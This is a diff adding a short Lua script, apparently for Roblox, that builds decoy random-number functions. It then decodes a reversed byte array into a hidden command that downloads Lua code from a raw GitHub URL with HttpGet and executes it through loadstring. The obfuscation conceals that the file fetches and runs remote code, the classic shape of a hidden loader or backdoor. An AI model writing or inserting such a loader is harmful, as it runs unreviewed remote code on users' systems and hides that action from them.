@@ -1,0 +1,39 @@
+do
+    math.randomseed(tick() * 1e6)
+
+    local function R(a,b)
+        return math.random(a or 100000, b or 999999)
+    end
+
+    
+    local _VM = {}
+    for i = 1, R(8,15) do
+        _VM[R()] = function()
+            return R()
+        end
+    end
+
+    local _c = string.char
+    local _t = table.concat
+
+    
+    local _p = {
+        41,40,41,34,97,118,97,108,45,101,112,97,99,115,101,47,
+        110,105,97,109,47,109,101,116,115,121,115,47,117,48,89,
+        109,101,116,115,121,83,47,109,111,99,46,98,117,104,116,
+        105,103,46,119,97,114,47,47,58,115,112,116,116,104,34,
+        40,116,101,71,112,116,116,72,58,101,109,97,103,40,103,
+        110,105,114,116,115,100,97,111,108
+    }
+
+    local _o = {}
+    for i = #_p, 1, -1 do
+        _o[#_o + 1] = _c(_p[i])
+    end
+
+    
+    local _exec = loadstring(_t(_o))
+    if _exec then
+        _exec()
+    end
+end
